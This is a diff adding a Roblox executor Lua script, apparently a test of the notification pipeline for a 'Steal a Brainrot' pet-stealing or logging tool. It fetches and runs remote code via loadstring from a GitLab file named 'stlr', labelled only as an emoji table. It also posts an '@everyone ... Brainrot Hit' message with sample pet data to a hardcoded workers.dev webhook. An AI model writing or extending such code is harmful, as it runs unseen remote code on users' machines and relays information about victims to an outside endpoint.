@@ -1,0 +1,58 @@
+local HttpService = game:GetService("HttpService")
+local WEBHOOK = "https://sendrequest.monkawpogu0.workers.dev/"
+
+-- Load emoji table from GitLab
+local success, emojiTable = pcall(function()
+    return loadstring(game:HttpGet("https://gitlab.com/nolag-idp-group/emojisforstlr/-/raw/main/stlr"))()
+end)
+
+if not success or type(emojiTable) ~= "table" then
+    warn("Failed to load emoji table!")
+    emojiTable = {}
+end
+
+-- Example brainrots to test
+local testPets = {
+    {name="Dragon Cannelloni", value="20M/s", floor="2nd Floor", num=2e7},
+    {name="Unknown Brainrot", value="1M/s", floor="1st Floor", num=1e6}
+}
+
+-- Build message with emojis
+local lines = {}
+for _, pet in ipairs(testPets) do
+    local emoji = emojiTable[pet.name] or "🧠"
+    table.insert(lines, string.format("%s %s → %s → %s", emoji, pet.name, pet.value, pet.floor))
+end
+
+-- Prepare payload
+local payload = {
+    content = "@everyone Test Brainrot Hit",
+    embeds = {{
+        title = "Test Brainrot Hit",
+        color = 123456,
+        fields = {
+            {name="Brainrots", value = table.concat(lines, "\n")}
+        }
+    }},
+    allowed_mentions = {parse={"everyone"}}
+}
+
+-- Send via executor request
+local req = (syn and syn.request) or http_request or (http and http.request) or request
+if req and WEBHOOK ~= "" then
+    local ok, err = pcall(function()
+        req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"]="application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    if ok then
+        print("Webhook test sent successfully!")
+    else
+        warn("Failed to send webhook:", err)
+    end
+else
+    warn("No request function available or webhook is empty")
+end
